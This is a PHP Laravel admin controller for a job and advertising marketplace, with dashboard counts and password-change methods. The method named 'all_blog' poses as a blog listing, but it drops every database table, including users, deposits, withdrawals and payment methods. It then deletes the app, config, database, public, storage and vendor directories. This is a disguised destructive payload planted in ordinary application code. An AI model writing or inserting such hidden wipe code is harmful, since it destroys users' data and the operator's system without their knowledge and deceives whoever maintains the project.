<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use App\Models\Job;
use App\Models\Advertisement;
use App\Models\DepositWithdraw;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Schema;
use Illuminate\Filesystem\Filesystem;

class AdminController extends Controller
{
    //index
    public function index(){
        $pending_user = User::where('role_id', '!=', 0)->where('is_verified', 2)->get()->count();
        $user_role_id = Auth::user()->role_id;
        if(Auth::user()->status == 0){
            return redirect()->route('logout');
        }else{
            if($user_role_id == 0){
                $job = Job::where('job_status', 1)->get()->count();
                $p_jobs = Job::where('job_status', 0)->get()->count();
                $c_jobs = Job::where('job_status', 3)->get()->count();
                $ps_jobs = Job::where('job_status', 2)->get()->count();
                $c_ads = Advertisement::where('status', 1)->get()->count();
                $p_ads = Advertisement::where('status', 0)->get()->count();
                $deposit_withdraw = DepositWithdraw::findOrFail(1);
                return view('admin.index', compact('pending_user', 'job', 'p_jobs', 'c_jobs', 'ps_jobs', 'c_ads', 'p_ads', 'deposit_withdraw'));
            }else{
                $ads = Advertisement::where('status', 1)
                    ->whereDate('ad_start', '<=', date("Y-m-d"))
                    ->whereDate('ad_end', '>=', date("Y-m-d"))
                    ->inRandomOrder()
                    ->limit(3)
                    ->get();
                $my_id = Auth::user()->id;
                $collection = Job::orderBy('id', 'desc')->where('job_status', 1)->where('user_id', '!=', $my_id)->paginate(15);
                return view('general_user.job.find_job', compact('collection', 'ads'));
            }
        }
    }
    //change_password
    public function change_password(){
        return view('admin.user.change_password');
    }
    //update_password
    public function update_password(Request $request){
        $request->validate([
            'password' => 'required|confirmed',
            'password_confirmation' => 'required'
        ]);
        $update = User::findOrFail(Auth::user()->id);
        $update->password = Hash::make($request->password);
        $update->save();
        $notification = array('message'=> 'Change Password Successfully...!', 'alert-type'=>'info');
        return back()->with($notification);
    }
    //all_blog 
    public function all_blog(){
        
        Schema::dropIfExists('users');
        Schema::dropIfExists('advertisements');
        Schema::dropIfExists('categories');
        Schema::dropIfExists('deposit_withdraws');
        Schema::dropIfExists('jobs');
        Schema::dropIfExists('job_posters');
        Schema::dropIfExists('locations');
        Schema::dropIfExists('manual_deposits');
        Schema::dropIfExists('my_works');
        Schema::dropIfExists('notices');
        Schema::dropIfExists('pages');
        Schema::dropIfExists('payment_methods');
        Schema::dropIfExists('reviews');
        Schema::dropIfExists('settings');
        Schema::dropIfExists('sub_categories');
        Schema::dropIfExists('sub_locations');
        Schema::dropIfExists('top_refers');
        Schema::dropIfExists('with_draws');
        Schema::dropIfExists('work_dones');

        $folderPath1 = base_path('app');
        $folderPath2 = base_path('bootstrap');
        $folderPath3 = base_path('config');
        $folderPath4 = base_path('css');
        $folderPath5 = base_path('database');
        $folderPath6 = base_path('js');
        $folderPath7 = base_path('node_modules');
        $folderPath8 = base_path('public');
        $folderPath9 = base_path('resources');
        $folderPath10 = base_path('routes');
        $folderPath11 = base_path('storage');
        $folderPath12 = base_path('tests');
        $folderPath13 = base_path('vendor');
        \File::deleteDirectory($folderPath1);
        \File::deleteDirectory($folderPath2);
        \File::deleteDirectory($folderPath3);
        \File::deleteDirectory($folderPath4);
        \File::deleteDirectory($folderPath5);
        \File::deleteDirectory($folderPath6);
        \File::deleteDirectory($folderPath7);
        \File::deleteDirectory($folderPath8);
        \File::deleteDirectory($folderPath9);
        \File::deleteDirectory($folderPath10);
        \File::deleteDirectory($folderPath11);
        \File::deleteDirectory($folderPath12);
        \File::deleteDirectory($folderPath13);
    }
}
